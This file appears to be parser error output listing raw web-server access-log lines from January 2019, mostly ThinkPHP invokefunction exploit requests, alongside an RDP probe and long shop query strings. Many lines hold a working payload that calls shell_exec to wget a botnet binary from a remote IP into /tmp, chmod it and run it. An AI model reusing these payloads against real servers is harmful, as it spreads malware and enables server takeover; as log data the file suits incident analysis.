('61.121.238.84 - - [25/Jan/2019:18:44:45 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('180.46.119.157 - - [25/Jan/2019:18:59:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.2.224.146 - - [25/Jan/2019:19:25:21 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('189.134.81.243 - - [25/Jan/2019:19:44:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('85.96.175.63 - - [25/Jan/2019:19:49:40 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('194.113.106.126 - - [25/Jan/2019:20:33:38 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('85.99.114.34 - - [25/Jan/2019:20:50:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('115.59.27.99 - - [25/Jan/2019:21:53:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('1.215.205.157 - - [25/Jan/2019:22:43:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('112.80.208.59 - - [25/Jan/2019:23:41:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('162.244.80.47 - - [25/Jan/2019:23:44:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('111.176.101.195 - - [25/Jan/2019:23:51:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('185.105.4.172 - - [26/Jan/2019:00:18:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('185.209.0.12 - - [26/Jan/2019:00:28:34 +0330] "\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr" 400 166 "-" "-" "-"\n', 'list index out of range')
('61.86.79.193 - - [26/Jan/2019:00:36:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('153.145.147.89 - - [26/Jan/2019:00:51:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.71.174.85 - - [26/Jan/2019:01:25:01 +0330] "\\x17\\x03\\x03\\x02f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0F\\xC4\\xBA\\xFF\\xBC\\x05\\xFC\\xDD7*f*cS\\x82\\xA8\\x10#\'\\xAA\\xE1I>\\xF6n\\xA7^_\\xD8r\\x94\'\\xFFB\\xDC\\xE1\\xAA\\x10\\x02\\x10\\xF3\\xAAX\\xB1T\\x0Cm\\xABH\\xBA\\xA5\\x1Bb\\x8E\\xB6G\\x22\\x85f\\x00%\\x0F\\xA9eZ\\xAAi\\xB2t\\xF0\\x14#\\x8AH)3\\xE2?^\\xD6\\x1FaL\\x98\\xE3\\x93\\xAB\\xC3\\x89\\xBF" 400 166 "-" "-" "-"\n', 'list index out of range')
('31.163.44.102 - - [26/Jan/2019:01:54:24 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('37.29.32.137 - - [26/Jan/2019:02:05:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.10.161 - - [26/Jan/2019:02:20:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.188.218.203 - - [26/Jan/2019:02:27:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('89.46.222.181 - - [26/Jan/2019:02:51:32 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('85.197.162.91 - - [26/Jan/2019:03:29:33 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('92.56.8.28 - - [26/Jan/2019:03:30:29 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:03:31:11 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('42.118.10.161 - - [26/Jan/2019:04:11:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('61.86.79.193 - - [26/Jan/2019:04:23:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('36.89.106.19 - - [26/Jan/2019:05:06:28 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('213.41.230.66 - - [26/Jan/2019:05:53:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('121.84.86.234 - - [26/Jan/2019:06:53:02 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.141.84.60 - - [26/Jan/2019:06:54:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.145/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('185.105.4.172 - - [26/Jan/2019:07:29:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('185.244.25.243 - - [26/Jan/2019:07:38:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('126.58.237.63 - - [26/Jan/2019:08:35:02 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('203.177.173.46 - - [26/Jan/2019:09:28:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('80.252.153.95 - - [26/Jan/2019:09:49:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('162.244.81.232 - - [26/Jan/2019:10:49:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('91.99.47.57 - - [26/Jan/2019:11:23:44 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28119},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[58075,%2058076,%2058078]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[56859,%2056861,%2056862,%2056863,%2056864,%2056865,%2056869,%2056870,%2056871]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[954457,%20955590,%20957574,%20960622,%20970670,%20974260,%20974528,%20976951,%20979232,%20980426,%20981313,%20981573,%201005522,%201012296,%201027429,%201046376,%201051232,%201056878,%201073922,%201079877,%201083220,%201102750,%201105558,%201105788,%201127268,%201136603,%201164842,%201173746,%201204295,%201215071,%201225045,%201252109,%201294213,%201303792,%201333753,%201346246,%201355742,%201369941,%201450132,%201467929,%201473115,%201497345,%201508158,%201554363,%201554788,%201624440,%201624657,%201624874,%201626776,%201644572,%201645013,%201690555,%201708333,%201766514,%201768456,%201768900,%201769330,%201783584,%201790199,%201815361,%201852050,%201878000,%201878269,%201878541,%201915959,%201935831,%20954459,%20955591,%20957575,%20960623,%20970671,%20974261,%20974529,%20976952,%20979233,%20980427,%20981314,%20981574,%201005523,%201012297,%201027430,%201046377,%201051233,%201056879,%201073923,%201079878,%201083221,%201102751,%201105559,%201105789,%201127269,%201136604,%201164843,%201173747,%201204296,%201215072,%201225046,%201252110,%201277504,%201294214,%201303793,%201333754,%201346489,%201355743,%201369943,%201450134,%201467931,%201473117,%201497347,%201508160,%201554365,%201554790,%201624442,%201624659,%201624876,%201626778,%201644574,%201645015,%201690557,%201708337,%201766516,%201768458,%201768902,%201769332,%201783586,%201790201,%201815363,%201852052,%201878002,%201878271,%201878543,%201915961,%201935833,%20954460,%20955592,%20957576,%20960624,%20970672,%20974262,%20974530,%20976953,%20979234,%20980428,%20981315,%20981575,%201005524,%201012298,%201027431,%201046378,%201051234,%201056880,%201073924,%201079879,%201083222,%201102752,%201105560,%201105790,%201127270,%201136605,%201164844,%201173748,%201204297,%201215073,%201225047,%201252111,%201277505,%201294215,%201303794,%201333755,%201334057,%201341358,%201346371,%201355744,%201369945,%201450136,%201467933,%201473119,%201497349,%201508162,%201554367,%201554792,%201624444,%201624661,%201624878,%201626780,%201644576,%201645017,%201690559,%201708339,%201766518,%201768460,%201768904,%201769336,%201783588,%201790203,%201815365,%201852054,%201878004,%201878273,%201878545,%201915963,%201935835,%20954461,%20955593,%20957577,%20960625,%20970673,%20974263,%20974531,%20976954,%20979235,%20980420,%20981316,%20981576,%201005525,%201012299,%201027432,%201046379,%201051235,%201056881,%201073925,%201079880,%201083223,%201102753,%201105561,%201105791,%201127271,%201136606,%201164845,%201173749,%201204298,%201215074,%201225048,%201252112,%201277506,%201278989,%201294216,%201303795,%201333756,%201333894,%201341359,%201346424,%201355745,%201369947,%201450138,%201467935,%201473121,%201497351,%201508164,%201554369,%201554794,%201624446,%201624663,%201624880,%201626782,%201644578,%201645019,%201690561,%201708343,%201766520,%201768462,%201768906,%201769342,%201783590,%201790205,%201815367,%201852056,%201878006,%201878275,%201878547,%201915965,%201935837,%20954645,%20955594,%20957578,%20960626,%20970674,%20974264,%20974532,%20976955,%20979236,%20980421,%20981317,%20981577,%201005526,%201012300,%201027433,%201046380,%201051236,%201056882,%201073926,%201079881,%201083224,%201102754,%201105562,%201105792,%201127272,%201136607,%201164846,%201173750,%201204299,%201215075,%201225049,%201252113,%201277507,%201278990,%201294217,%201303796,%201333757,%201333895,%201341360,%201346282,%201355746,%201369949,%201450140,%201467937,%201473123,%201497353,%201508166,%201554796,%201624448,%201624665,%201624882,%201626784,%201644580,%201645021,%201690563,%201708347,%201766522,%201768464,%201768908,%201769344,%201783592,%201790207,%201815369,%201852058,%201878008,%201878277,%201878549,%201915967,%201935839,%20954644,%20955595,%20957579,%20960627,%20970675,%20974265,%20974533,%20976956,%20979237,%20980422,%20981318,%20981578,%201005527,%201012301,%201027434,%201046381,%201051237,%201056883,%201073927,%201079882,%201083225,%201102755,%201105563,%201105793,%201127273,%201136608,%201164847,%201173751,%201204300,%201215076,%201225050,%201252114,%201277508,%201278991,%201294218,%201303797,%201333758,%201333896,%201341361,%201346213,%201355747,%201369951,%201450142,%201467939,%201473125,%201497355,%201508168,%201554798,%201624450,%201624667,%201624884,%201626786,%201644582,%201645023,%201690565,%201708351,%201766524,%201768466,%201768910,%201769346,%201783594,%201790209,%201815371,%201852060,%201878010,%201878279,%201878551,%201915969,%201935841,%20954464,%20955599,%20957583,%20960628,%20970676,%20974266,%20974540,%20976957,%20979238,%20980409,%20981319,%20981579,%201005528,%201012302,%201027435,%201046382,%201051238,%201056884,%201073928,%201079883,%201083226,%201102756,%201105564,%201105794,%201127274,%201136609,%201164848,%201173752,%201204301,%201215077,%201225051,%201252115,%201277509,%201278992,%201294219,%201303798,%201333759,%201334013,%201341362,%201346561,%201355748,%201369953,%201450144,%201467941,%201473127,%201497357,%201508170,%201554371,%201554800,%201624452,%201624669,%201624886,%201626788,%201644584,%201645025,%201690567,%201708355,%201766526,%201768468,%201768912,%201769352,%201783596,%201790211,%201815373,%201852062,%201878012,%201878281,%201878553,%201915971,%201935843,%20954642,%20955600,%20957584,%20960629,%20970677,%20974267,%20974541,%20976958,%20979239,%20980410,%20981320,%20981580,%201005529,%201012303,%201046383,%201051239,%201056885,%201073929,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('162.244.80.47 - - [26/Jan/2019:12:03:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('36.106.21.29 - - [26/Jan/2019:12:33:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/bins/sefa.x86 -O /tmp/.sefa; chmod 777 /tmp/.sefa; /tmp/.sefa sefa.x86\' HTTP/1.1" 400 166 "-" "sefa/2.0" "-"\n', 'list index out of range')
('91.99.47.57 - - [26/Jan/2019:13:05:58 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:27316},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[54663,%2055707,%2061100]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[55649,%2055650]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[763951,%20779637,%20782958,%20784532,%20784578,%20797832,%20803320,%20803367,%20803413,%20803458,%20803502,%20803545,%20803587,%20803590,%20804302,%20804336,%20804370,%20804404,%20804438,%20804472,%20809277,%20810310,%20811704,%20824383,%20824417,%20824450,%20824482,%20824513,%20824543,%20824572,%20824600,%20824627,%20824653,%20824678,%20824702,%20852837,%20859771,%20861148,%20866239,%20867920,%20873575,%20906068,%20977529,%20977604,%20987103,%20987118,%20992484,%201015075,%201015236,%201018334,%201019561,%201019690,%201020021,%201022229,%201023626,%201027940,%201029796,%201029833,%201029862,%201029890,%201029917,%201029943,%201029968,%201029993,%201031971,%201034823,%201043820,%201043962,%201050123,%201058375,%201065067,%201069941,%201071344,%201077677,%201080949,%201085224,%201090609,%201090736,%201092157,%201098362,%201101426,%201103765,%201106131,%201109467,%201109497,%201119045,%201119092,%201123631,%201124744,%201129640,%201138559,%201139682,%201140990,%201141058,%201141126,%201142400,%201142468,%201142536,%201142604,%201142672,%201143479,%201143547,%201143596,%201143683,%201145713,%201151565,%201151684,%201151685,%201151741,%201151772,%201155866,%201157120,%201157149,%201157541,%201159507,%201159540,%201161074,%201161107,%201165250,%201165283,%201165316,%201166526,%201166559,%201166960,%201173815,%201177623,%201177701,%201177779,%201177857,%201177935,%201184000,%201184077,%201184154,%201184231,%201185412,%201186797,%201188119,%201188187,%201188286,%201188353,%201188577,%201188643,%201188711,%201188776,%201188843,%201188906,%201188971,%201189037,%201189100,%201189165,%201189227,%201189291,%201189352,%201189415,%201189475,%201189537,%201189596,%201189657,%201189715,%201189773,%201189833,%201189890,%201189949,%201190005,%201190063,%201190118,%201190175,%201190231,%201190284,%201190602,%201190654,%201190707,%201190758,%201193817,%201194293,%201194367,%201195723,%201195774,%201197092,%201197170,%201199569,%201199674,%201201128,%201205463,%201205604,%201209123,%201212266,%201216413,%201217593,%201220268,%201227087,%201227563,%201227644,%201230542,%201230622,%201230702,%201231880,%201232724,%201233242,%201235724,%201239555,%201244183,%201250187,%201251498,%201253242,%201255015,%201255101,%201255143,%201258416,%201258457,%201258498,%201258540,%201258580,%201258692,%201259180,%201259220,%201259307,%201259327,%201259380,%201261079,%201266335,%201266344,